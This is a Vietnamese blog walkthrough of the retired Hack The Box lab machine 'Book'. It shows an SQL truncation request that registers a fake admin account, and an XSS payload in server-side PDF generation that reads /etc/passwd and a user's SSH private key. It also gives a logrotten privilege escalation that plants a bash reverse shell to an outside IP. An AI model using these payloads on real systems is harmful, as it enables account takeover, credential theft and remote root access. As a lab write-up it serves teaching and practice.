# Mở đầu
![](https://images.viblo.asia/7b5ccc73-edf0-4896-b641-10e539792f55.png)
Trở lại với series Writeup Hackthebox, ngày hôm qua Hackthebox đã cho retired bài Book này, được đánh giá là Medium. Bài này được mình làm từ 24/03 nhưng đến giờ mới được public. Hãy cùng mình tìm hiểu xem bài này chơi thế nào nha.
# Get User
Quét nmap thấy server này có trang web tại cổng 80.
Thực hiện đăng ký thì vào ổn k có vấn đề gì, thực hiện đăng ký theo mail `admin@book.htb` thì báo tài khoản này đã tồn tại. 

Nhớ đến bài postbook ngày xưa thì đăng ký được theo đúng email của admin thì đăng nhập lại sẽ lên được admin

```http
POST /index.php HTTP/1.1
Host: 10.10.10.176
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.176/index.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
Connection: close
Cookie: PHPSESSID=ace5kg7uekbf6mo1bjjcb3iq6h
Upgrade-Insecure-Requests: 1

name=admin&email=admin%40book.htb    11&password=admin@123
```
Ở đây được gọi là tấn công SQL truncation. Cắt ngắn chuỗi SQL để bypass check name. 

Đăng ký được tài khoản admin thì ngó xung quanh xem có chức năng gì.

Có 1 chức năng là Collection, giúp đăng sách lên, và admin có 1 chức năng là xem 1 danh sách Collection đó.


![](https://images.viblo.asia/de87b3e2-a188-4ebf-a9a8-088a85b6baf2.png)


Và đây là nội dung của Collections

![](https://images.viblo.asia/f3e26164-8c33-44c2-a785-cbf8b61eed95.png)


Ở đây, trong trang web có 1 chức năng là lấy tên sách và tác giả ghi vào file PDF bằng JS ở phía Server, qua đây có thể sử dụng JS để ghi file local vào trong file PDF để có thể đọc

```html 
<script>
x=new XMLHttpRequest;
x.onload=function(){
document.write(this.responseText)
};
x.open("GET","file:///etc/passwd");
x.send();
</script>
```

Điền tên sách với payload trên và thu kết quả


![](https://images.viblo.asia/f423b109-64a0-4b39-9c8f-ad25e215e631.png)


Đọc được file `/etc/passwd`, chúng ta có thể đọc file key rsa để có thể ssh đến server, ở đây có người dùng `reader`, có thể đoán thư mục key rsa là 
`/home/reader/.ssh/id_rsa`


![](https://images.viblo.asia/67e2c0da-e4f1-4362-94ad-6f0b601ba6cf.png)


Lấy được file private key, có thể sử dụng để ssh đến server

Do file PDF k hiển thị đầy đủ private key, ở đây sử dụng công cụ để convert pdf sang text để lấy hết text từ file pdf
https://github.com/pdfminer/pdfminer.six/

Lấy được privatekey rồi thì có thể ssh đến server

Lấy cờ User
# Get Root
Chạy `pspy64` để xem các tiến trình đang chạy trên server thì thấy

![](https://images.viblo.asia/2272574e-b6dc-453b-a0bf-aef4f6225aee.png)


Root đang chạy chương trình `logrotate` để ghi vào log, tìm kiếm trên google xem chương trình này có exploit như nào thì có chương trình tại đây
https://github.com/whotwagner/logrotten

Compile gcc chương trình `logrotten` rồi đẩy lên trên box, đọc hướng dẫn ở trang github thì tạo 1 file payload lưu vào payloadfile
```
reader@book:/tmp$ echo “bash -i >& /dev/tcp/10.10.14.5/4444 0>&1” > payloadfile
```
Sau đó chạy chương trình và ghi vào file `access.log` thấy ở thư mục `backups` của user
```sh
reader@book:/tmp$ ./logrotten -p ./payloadfile ~/backups/access.log -d
logfile: /home/reader/backups/access.log
logpath: /home/reader/backups
logpath2: /home/reader/backups2
targetpath: /etc/bash_completion.d/access.log
targetdir: /etc/bash_completion.d
p: access.log
Waiting for rotating /home/reader/backups/access.log...
Renamed /home/reader/backups with /home/reader/backups2 and created symlink to /etc/bash_completion.d
Waiting 1 seconds before writing payload...
Done!
```
Mở thêm 1 terminal nữa để ghi vào file access.log
```
reader@book:~$ echo '1' > backups/access.log
```
Lần này chúng ta chỉ có 5s để đọc cờ, sau đó là bị đóng kết nối, tại máy lắng nghe cổng 4444, sau khi lên root rồi đọc cờ ngay :v
# Kết
Một bài mà có khá nhiều kỹ thuật trong này, hi vọng mọi người có thể học được gì từ nó. Happy hacking!